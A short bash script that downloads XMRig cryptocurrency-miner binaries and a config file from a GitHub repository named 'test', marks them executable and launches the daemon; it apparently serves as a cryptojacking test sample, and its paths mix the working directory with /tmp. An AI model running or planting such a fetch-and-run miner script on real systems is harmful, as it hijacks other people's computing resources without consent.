#!/bin/bash

wget https://github.com/jeffthorne/test/raw/main/xmrigDaemon -O xmrigDaemon
chmod +x xmrigDaemon
wget https://github.com/jeffthorne/test/raw/main/xmrigMiner -O xmrigMiner
chmod +x /tmp/xmrigMiner
wget https://raw.githubusercontent.com/jeffthorne/test/main/config.json -O config.json
./xmrigDaemon --config /tmp/config.json

